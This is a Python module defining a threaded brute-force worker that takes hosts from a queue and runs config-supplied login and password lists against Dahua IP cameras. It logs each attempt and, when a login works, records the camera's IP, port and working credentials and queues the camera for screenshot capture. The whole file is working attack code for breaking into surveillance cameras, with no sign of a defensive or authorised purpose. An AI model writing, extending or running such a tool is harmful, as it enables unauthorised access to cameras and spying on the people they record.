import logging
import threading

import config
from dahua import DahuaController, Status


class BruteThread(threading.Thread):
    def __init__(self, brute_queue, screenshot_queue):
        threading.Thread.__init__(self)
        self.brute_queue = brute_queue
        self.screenshot_queue = screenshot_queue

        self._dahua = DahuaController()

    def run(self):
        while True:
            with threading.Lock():
                host = self.brute_queue.get()
            self.dahua_auth(host)
            self.brute_queue.task_done()

    def dahua_login(self, login, password):
        with threading.Lock():
            config.update_status()
            logging.debug(f'Login attempt: {self._dahua.ip} with {login}:{password}')
        self._dahua.auth(login, password)
        if self._dahua.status is Status.SUCCESS:
            logging.debug(f'Success login: {self._dahua.ip} with {login}:{password}')
            return self._dahua
        elif self._dahua.status is Status.BLOCKED:
            logging.debug(f'Blocked camera: {self._dahua.ip}:{self._dahua.port}')
            return None
        else:
            logging.debug(f'Unable to login: {self._dahua.ip}:{self._dahua.port} with {login}:{password}')
            return None

    def dahua_auth(self, host):
        self._dahua.ip = host[0]
        self._dahua.port = int(host[1])
        for login in config.logins:
            for password in config.passwords:
                try:
                    res = self.dahua_login(login, password)
                    if res is None:
                        break
                    config.working_hosts.append([res.ip, res.port, res.login, res.password, res])
                    config.ch_count += res.channels_count
                    self.screenshot_queue.put(res)
                    return
                except Exception as e:
                    logging.debug(f'Connection error: {self._dahua.ip}:{self._dahua.port} - {str(e)}')
                    return
